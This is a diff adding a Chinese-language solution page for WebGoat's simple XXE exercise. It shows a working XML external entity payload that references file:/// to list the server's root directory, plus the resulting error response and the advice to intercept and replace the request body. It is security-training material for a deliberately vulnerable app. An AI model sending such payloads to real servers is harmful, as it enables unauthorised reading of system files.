@@ -1,0 +1,52 @@
+=== 练习解答
+
+本练习的目标是列出文件系统的根目录。如果先尝试普通 POST 请求，可以看到以下请求：
+
+[source, xml]
+----
+POST /WebGoat/xxe/simple
+Content-Type: application/xml
+
+<?xml version="1.0"?><comment><text>This is my first comment, nice picture</text></comment>
+----
+
+网页会通过 XHR 请求提交 XML 消息，之后评论会显示在评论区。现在按照上一节的示例，稍微修改一下请求：
+
+[source, xml]
+----
+POST /WebGoat/xxe/simple
+Content-Type: application/xml
+
+<?xml version="1.0" ?><!DOCTYPE user [<!ENTITY root SYSTEM "file:///"> ]><comment><text>&root;</text></comment>
+----
+
+我们没有包含特定文件，而是通过 `file:///` 引用了文件系统的根目录。如果只是将其复制粘贴到评论文本框中，响应正文会显示错误：
+
+[source,json]
+----
+{
+  "lessonCompleted" : false,
+  "feedback" : "Sorry the solution is not correct, please try again.",
+  "output" : "...javax.xml.stream.XMLStreamException: ParseError at [row,col]:[1,44]\\nMessage: The processing instruction target matching \\\"[xX][mM][lL]\\\" is not allowed.]"
+  "assignment" : "SimpleXXE",
+  "attemptWasMade" : true
+}
+----
+
+这是因为 JavaScript 获取了输入，并生成了以下消息：
+
+[source%linenums, xml]
+----
+POST /WebGoat/xxe/simple
+Content-Type: application/xml
+
+<?xml version="1.0"?>
+<comment>
+  <text>
+    <?xml version="1.0" standalone="yes" ?><!DOCTYPE user [<!ENTITY root SYSTEM "file:///"> ]><comment><text>&root;</text></comment>
+  </text>
+</comment>
+----
+如果使用评论表单，第 7 行包含的就是在文本框中输入的内容。
+
+要完成课程，你必须拦截完整的传出请求，并将整个请求正文替换为正确的载荷。请参阅有关拦截 HTTP 流量的课程。
